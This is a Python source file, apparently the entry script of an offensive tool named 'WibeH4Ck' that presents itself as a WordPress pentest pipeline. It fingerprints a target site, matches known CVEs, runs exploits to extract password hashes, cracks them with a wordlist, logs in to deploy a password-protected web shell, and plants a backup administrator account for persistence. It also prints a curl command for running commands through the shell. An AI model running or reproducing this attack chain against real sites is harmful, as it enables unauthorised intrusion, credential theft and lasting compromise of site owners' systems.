# language: python, file: wibeh4ck.py
#!/usr/bin/env python3
import argparse, sys, os
from core.http import HTTP
from core.output import export_json, p_print
from recon.fingerprint import fingerprint
from exploit import match_vulns, run_exploit
from post.crack import crack_hashes
from post.shell import deploy_shell
from post.persist import create_admin


def main():
    ap = argparse.ArgumentParser(description="WibeH4Ck — WordPress pentest pipeline")
    ap.add_argument("-t", "--target", required=True)
    ap.add_argument("--proxy")
    ap.add_argument("--user")
    ap.add_argument("--password")
    ap.add_argument("--shell-password")
    ap.add_argument("--db", default="data/wordfence.json")
    ap.add_argument("--wordlist", default="wordlists/rockyou.txt")
    ap.add_argument("--phase", choices=["recon","match","exploit","crack","shell","persist","all"], default="all")
    ap.add_argument("--skip", action="append", default=[])
    ap.add_argument("-o", "--output")
    ap.add_argument("-v", "--verbose", action="store_true")
    args = ap.parse_args()

    http = HTTP(proxy=args.proxy)
    state = {"target": args.target, "phases": []}

    def allowed(name):
        return name not in args.skip and (args.phase == "all" or args.phase == name)

    # 1. recon
    if allowed("recon"):
        p_print("[1/6] fingerprint")
        try:
            fp = fingerprint(args.target, http)
            state["fingerprint"] = fp
            p_print(f"  wp={fp.get('wp_version')} plugins={len(fp['plugins'])} "
                    f"users={len(fp['users'])} waf={fp.get('waf')}")
            state["phases"].append("recon")
        except Exception as e:
            p_print(f"  recon failed: {e}")

    # 2. match
    if allowed("match") and "fingerprint" in state:
        p_print("[2/6] match")
        try:
            vulns = match_vulns(state["fingerprint"], args.db)
            state["vulns"] = vulns
            p_print(f"  {len(vulns)} candidates")
            for v in vulns[:5]:
                p_print(f"    cvss={v.get('cvss')} {v.get('cve')} {v.get('title')[:60]}")
            state["phases"].append("match")
        except Exception as e:
            p_print(f"  match failed: {e}")

    # 3. exploit
    hashes = {}
    if allowed("exploit") and state.get("vulns"):
        p_print("[3/6] exploit")
        for v in state["vulns"]:
            try:
                r = run_exploit(v, args.target, http)
            except Exception as e:
                p_print(f"  {v.get('cve')} threw: {e}")
                continue
            if r.get("success"):
                p_print(f"  hit: {v.get('cve')}")
                for u, h in r.get("hashes", {}).items():
                    hashes[u] = h
                    p_print(f"    {u}:{h[:34]}...")
                state["phases"].append("exploit")
                break
            else:
                p_print(f"  {v.get('cve')}: {r.get('error','no')}")
        state["hashes"] = hashes

    # 4. crack
    if allowed("crack") and hashes:
        p_print(f"[4/6] crack {len(hashes)} hashes")
        try:
            cracked = crack_hashes(hashes, args.wordlist)
            if "__error__" in cracked:
                p_print(f"  crack: {cracked['__error__']}")
            else:
                state["cracked"] = cracked
                for u, pw in cracked.items():
                    p_print(f"  CRACKED {u}:{pw}")
                if cracked:
                    state["phases"].append("crack")
        except Exception as e:
            p_print(f"  crack failed: {e}")

    # 5. shell
    user = args.user
    pw = args.password
    if not (user and pw) and state.get("cracked"):
        user, pw = next(iter(state["cracked"].items()))

    if allowed("shell") and user and pw:
        p_print(f"[5/6] login+shell as {user}")
        try:
            shell_pw = args.shell_password or "Wibe_" + os.urandom(4).hex()
            http2 = HTTP(proxy=args.proxy)
            r = deploy_shell(args.target, http2, user, pw, shell_pw)
            state["shell"] = r
            if r.get("success"):
                p_print(f"  SHELL  {r['url']}")
                p_print(f"  PASS   {r['password']}")
                p_print(f"  USE    curl -d 'auth={r['password']}&cmd=id' {r['url']}")
                state["phases"].append("shell")
            else:
                p_print(f"  failed: {r.get('error')}")
        except Exception as e:
            p_print(f"  shell failed: {e}")

    # 6. persist
    if allowed("persist") and state.get("shell", {}).get("success"):
        p_print("[6/6] persist")
        try:
            r = create_admin(args.target, http,
                             state["shell"]["url"], state["shell"]["password"])
            if r.get("success"):
                p_print(f"  backup admin  {r['user']}:{r['password']}")
                p_print(f"  login         {r['login_url']}")
                state["persist"] = r
                state["phases"].append("persist")
            else:
                p_print(f"  failed: {r.get('error')}")
        except Exception as e:
            p_print(f"  persist failed: {e}")

    _finish(state, args)
    sys.exit(0)


def _finish(state, args):
    p_print("\n=== SUMMARY ===")
    for k in ("fingerprint","vulns","hashes","cracked","shell","persist"):
        if k in state:
            p_print(f"  {k}: ok")
    sh = state.get("shell") or {}
    if sh.get("success"):
        p_print(f"\n  SHELL  {sh['url']}")
        p_print(f"  PASS   {sh['password']}")
    if args.output:
        export_json(args.output, state)
        p_print(f"  saved: {args.output}")


if __name__ == "__main__":
    main()
